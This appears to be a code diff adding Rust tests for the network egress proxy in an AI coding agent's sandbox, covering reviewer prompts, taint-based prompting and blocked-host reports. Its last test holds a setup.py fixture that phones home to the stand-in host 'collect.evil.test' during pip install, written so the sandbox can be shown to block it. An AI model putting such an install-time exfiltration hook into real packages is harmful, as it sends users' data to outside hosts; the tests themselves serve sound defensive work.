@@ -1137,12 +1137,18 @@ async fn the_sandbox_tmp_goes_with_the_session() {
 
 /// A chat with the build tools on, in a workspace of its own.
 fn tooled(responses: Value, over: &[(&str, &str)]) -> (Direct, ScratchDir) {
-    let mut all = vec![("TOOLS_ENABLED", "1")];
-    all.extend_from_slice(over);
     // The tool-parser preflight answers first.
     let mut rs = vec![json!({"message": ""})];
     rs.extend(responses.as_array().unwrap().iter().cloned());
-    let mut d = direct(Value::Array(rs), &all);
+    shell_chat(Value::Array(rs), over)
+}
+
+/// A chat with the build tools on in a workspace of its own, for calling
+/// its tools directly: no turn, so no preflight request.
+fn shell_chat(responses: Value, over: &[(&str, &str)]) -> (Direct, ScratchDir) {
+    let mut all = vec![("TOOLS_ENABLED", "1")];
+    all.extend_from_slice(over);
+    let mut d = direct(responses, &all);
     let scratch = ScratchDir::new("tool-loop").unwrap();
     let ws = scratch.path().join("ws");
     std::fs::create_dir_all(&ws).unwrap();
@@ -1482,4 +1488,309 @@ async fn commands_run_sandboxed_without_asking() {
     let asked = std::iter::from_fn(|| d.rx.try_recv().ok())
         .any(|e| matches!(e.msg, EventMsg::QuestionRequest(_)));
     assert!(!asked, "nothing was asked");
+}
+
+// ------------------------------------------- the egress proxy (WP 4.8)
+
+fn network_args(cmd: &str) -> serde_json::Map<String, Value> {
+    let mut args = serde_json::Map::new();
+    args.insert("command".into(), json!(cmd));
+    args.insert("needs_network".into(), json!(true));
+    args
+}
+
+fn verdict(risk: &str) -> Value {
+    json!({"message": json!({"risk": risk, "reason": "fine"}).to_string()})
+}
+
+/// What the reviewer was told between `<network>` and `</network>`.
+fn told_network(mock: &MockLlm) -> Vec<String> {
+    mock.chat_bodies()
+        .iter()
+        .filter_map(|b| b["messages"][1]["content"].as_str().map(str::to_string))
+        .filter_map(|u| {
+            let start = u.find("<network>\n")? + "<network>\n".len();
+            let end = u.find("\n</network>")?;
+            Some(u[start..end].to_string())
+        })
+        .collect()
+}
+
+// rpctl's ChatEgressTests.test_policy_hosts_reach_the_prompt_and_the_reviewer,
+// with SANDBOX_NET_ALLOW in place of a host the user allowed for fetch_url
+// (phase 5). The reviewer refuses, so nothing runs.
+#[tokio::test]
+async fn policy_hosts_reach_the_prompt_and_the_reviewer() {
+    let (mut d, _s) = shell_chat(
+        json!([verdict("critical")]),
+        &[("SANDBOX_NET_ALLOW", "mirror.corp.test")],
+    );
+    if d.chat.auto_ready().await.is_err() {
+        eprintln!("skipped: no sandbox here");
+        return;
+    }
+    let ctx = d.ctx.clone();
+    let (result, _) = d
+        .chat
+        .run_shell(
+            &ctx,
+            "c1",
+            &network_args("curl -fsSLO https://example.com/f.tgz"),
+        )
+        .await;
+    assert_eq!(result["denied"], true, "{result}");
+    let reach =
+        "registries + example.com (from the command) + mirror.corp.test (SANDBOX_NET_ALLOW)";
+    assert!(d.said().contains(&format!("  network: {reach}")));
+    assert_eq!(told_network(&d.mock), [reach]);
+}
+
+// rpctl's ChatEgressTests.test_taint_still_asks_and_names_the_hosts.
+#[tokio::test]
+async fn taint_still_asks_and_names_the_hosts() {
+    let (mut d, _s) = shell_chat(json!([]), &[]);
+    if d.chat.auto_ready().await.is_err() {
+        eprintln!("skipped: no sandbox here");
+        return;
+    }
+    d.chat.web_taint = Some("a fetched web page".into());
+    let ctx = d.ctx.clone();
+    let old = std::mem::replace(&mut d.rx, tokio::sync::mpsc::unbounded_channel().1);
+    let answering = tokio::spawn(async move {
+        let mut old = old;
+        let mut said = Vec::new();
+        while let Some(e) = old.recv().await {
+            match e.msg {
+                EventMsg::Notice(n) => said.push(n.message),
+                EventMsg::QuestionRequest(q) => {
+                    said.extend(q.question.reason.iter().map(|r| r.message.clone()));
+                    ctx.answer(&q.question_id, viy_protocol::Answer::No);
+                    return said;
+                }
+                _ => {}
+            }
+        }
+        said
+    });
+    let ctx = d.ctx.clone();
+    let (result, _) = d
+        .chat
+        .run_shell(&ctx, "c1", &network_args("pip install requests"))
+        .await;
+    assert_eq!(result["declined"], true, "{result}");
+    let said = answering.await.unwrap();
+    assert!(
+        said.contains(&"  network: registries".to_string()),
+        "{said:?}"
+    );
+    assert!(
+        d.mock.chat_bodies().is_empty(),
+        "the reviewer was not asked"
+    );
+}
+
+// rpctl's ChatEgressTests.test_network_report_lines_hints_and_events,
+// without the tracer's events (WP 4.11): the report as the proxy counted
+// it, the lines shown and the hint.
+#[tokio::test]
+async fn network_report_lines_and_hints() {
+    let (mut d, _s) = shell_chat(json!([]), &[]);
+    let proxy = viy_tools::egress::Proxy::new(viy_tools::egress::Policy::default());
+    proxy.record_reached("pypi.org", 3, 20_000, 900, 443);
+    proxy.record_reached("files.pythonhosted.org", 12, 41_000_000, 5_000, 443);
+    let not = viy_tools::egress::NOT_ALLOWED;
+    proxy.record_blocked("collect.evil.test", Some(443), not);
+    let ran = viy_tools::sandbox::Ran {
+        exit_code: Some(0),
+        timed_out: false,
+        stdout: String::new(),
+        stderr: String::new(),
+        net_error: None,
+    };
+    let rep = Value::Object(super::tools::report_egress(&d.ctx, &proxy, &ran));
+    assert_eq!(
+        rep["reached"],
+        json!([{"host": "pypi.org", "connections": 3},
+               {"host": "files.pythonhosted.org", "connections": 12}])
+    );
+    assert_eq!(
+        rep["blocked"],
+        json!([{"host": "collect.evil.test", "port": 443, "why": not}])
+    );
+    assert!(
+        rep["hint"]
+            .as_str()
+            .unwrap()
+            .contains("write the host in the command")
+    );
+    let said = d.said();
+    assert!(said.contains(&"  [net] pypi.org (3), files.pythonhosted.org (12, 41 MB)".into()));
+    assert!(said.contains(&format!("  [net blocked] collect.evil.test:443 - {not}")));
+}
+
+// rpctl's ChatEgressTests.test_tool_that_ignored_the_proxy_gets_a_hint.
+#[tokio::test]
+async fn a_tool_that_ignored_the_proxy_gets_a_hint() {
+    let (d, _s) = shell_chat(json!([]), &[]);
+    let proxy = viy_tools::egress::Proxy::new(viy_tools::egress::Policy::default());
+    let ran = viy_tools::sandbox::Ran {
+        exit_code: Some(6),
+        timed_out: false,
+        stdout: String::new(),
+        stderr: "fatal: unable to access: Could not resolve host: x.test".into(),
+        net_error: None,
+    };
+    let rep = super::tools::report_egress(&d.ctx, &proxy, &ran);
+    assert!(
+        rep["hint"]
+            .as_str()
+            .unwrap()
+            .contains("ignored HTTPS_PROXY"),
+        "{rep:?}"
+    );
+}
+
+// rpctl's ChatEgressTests.test_handover_failure_is_an_error_not_a_fallback,
+// with a launcher that is not installed and the real sandbox.
+#[tokio::test]
+async fn a_handover_failure_is_an_error_not_a_fallback() {
+    let (mut d, _s) = shell_chat(json!([verdict("low")]), &[]);
+    if d.chat.auto_ready().await.is_err() {
+        eprintln!("skipped: no sandbox here");
+        return;
+    }
+    d.chat.sandbox_launcher = viy_tools::sandbox::Launcher {
+        argv: &["python3-not-installed"],
+        code: "",
+    };
+    let ctx = d.ctx.clone();
+    let (result, _) = d
+        .chat
+        .run_shell(&ctx, "c1", &network_args("pip install x"))
+        .await;
+    assert!(
+        result["error"].as_str().unwrap().contains("did not run"),
+        "{result}"
+    );
+    assert_eq!(result["exit_code"], Value::Null);
+    assert!(d.said().iter().any(|s| s.contains("[network unavailable]")));
+}
+
+// rpctl's ChatEgressTests.test_host_mode_warns_and_shares_the_network: the
+// warning, the reviewer told the whole network, no proxy and no `network`
+// entry. The reviewer refuses here, so nothing runs on the host's network.
+#[tokio::test]
+async fn host_mode_warns_and_tells_the_reviewer_the_whole_network() {
+    let (mut d, _s) = shell_chat(json!([verdict("critical")]), &[("SANDBOX_NET", "host")]);
+    if d.chat.auto_ready().await.is_err() {
+        eprintln!("skipped: no sandbox here");
+        return;
+    }
+    assert_eq!(d.chat.tool_specs(), viy_tools::build::tools(true));
+    let ctx = d.ctx.clone();
+    let (result, _) = d
+        .chat
+        .run_shell(&ctx, "c1", &network_args("docker pull x"))
+        .await;
+    assert!(result.get("network").is_none(), "{result}");
+    let warned = std::iter::from_fn(|| d.rx.try_recv().ok()).any(|e| {
+        matches!(&e.msg, EventMsg::Notice(n)
+            if n.level == viy_protocol::NoticeLevel::Error && n.message.contains("SANDBOX_NET=host"))
+    });
+    assert!(warned);
+    assert_eq!(
+        told_network(&d.mock),
+        ["this machine's whole network, including its own services and the LAN"]
+    );
+}
+
+// rpctl's ChatEgressTests.test_unknown_mode_is_the_proxy.
+#[test]
+fn an_unknown_sandbox_net_is_the_proxy() {
+    let d = direct(
+        json!([]),
+        &[("TOOLS_ENABLED", "1"), ("SANDBOX_NET", "hots")],
+    );
+    assert_eq!(d.chat.tool_specs(), viy_tools::build::tools(false));
+}
+
+// rpctl's ChatEgressTests.test_offline_commands_get_no_proxy, with the real
+// sandbox: no `network` entry.
+#[tokio::test]
+async fn offline_commands_get_no_proxy() {
+    let (mut d, _s) = shell_chat(json!([]), &[]);
+    if d.chat.auto_ready().await.is_err() {
+        eprintln!("skipped: no sandbox here");
+        return;
+    }
+    let mut args = serde_json::Map::new();
+    args.insert("command".into(), json!("ls"));
+    let ctx = d.ctx.clone();
+    let (result, _) = d.chat.run_shell(&ctx, "c1", &args).await;
+    assert_eq!(result["exit_code"], 0, "{result}");
+    assert!(result.get("network").is_none(), "{result}");
+}
+
+const SETUP_PY: &str = "\
+import urllib.request
+from setuptools import setup
+for url in (\"http://collect.evil.test/c?d=README\", \"https://collect.evil.test/c\"):
+    try:
+        urllib.request.urlopen(url, timeout=10)
+        print(\"EXFIL REACHED\", url)
+    except Exception as e:
+        print(\"exfil failed:\", url, e)
+setup(name=\"egresstest\", version=\"0.1\", py_modules=[\"egresstest\"])
+";
+
+// rpctl's ExitCheckTests.test_pip_install_whose_setup_py_phones_home
+// (netaccess kb f028): an install-time script that contacts a host that is
+// neither a registry nor in the command completes, with the host blocked.
+// The real sandbox and the real proxy; nothing reaches the internet.
+#[tokio::test]
+async fn a_pip_install_whose_setup_py_phones_home() {
+    let (mut d, s) = shell_chat(json!([verdict("low")]), &[]);
+    if d.chat.auto_ready().await.is_err() {
+        eprintln!("skipped: no sandbox here");
+        return;
+    }
+    let pkg = s.path().join("ws/pkg");
+    std::fs::create_dir_all(&pkg).unwrap();
+    std::fs::write(pkg.join("setup.py"), SETUP_PY).unwrap();
+    std::fs::write(pkg.join("egresstest.py"), "X = 1\n").unwrap();
+    let ctx = d.ctx.clone();
+    let (out, _) = d
+        .chat
+        .run_shell(
+            &ctx,
+            "c1",
+            &network_args(
+                "pip install -v --no-index --no-build-isolation --target /tmp/t ./pkg && ls /tmp/t",
+            ),
+        )
+        .await;
+    assert_eq!(out["exit_code"], 0, "{out}");
+    let stdout = out["stdout"].as_str().unwrap();
+    assert!(stdout.contains("egresstest.py"), "{out}");
+    assert!(!format!("{stdout}{}", out["stderr"]).contains("EXFIL REACHED"));
+    let mut blocked: Vec<(String, u64)> = out["network"]["blocked"]
+        .as_array()
+        .unwrap()
+        .iter()
+        .map(|b| {
+            (
+                b["host"].as_str().unwrap().to_string(),
+                b["port"].as_u64().unwrap(),
+            )
+        })
+        .collect();
+    blocked.sort();
+    assert_eq!(
+        blocked,
+        [
+            ("collect.evil.test".into(), 80),
+            ("collect.evil.test".into(), 443)
+        ]
+    );
+    assert_eq!(out["network"]["reached"], json!([]));
 }
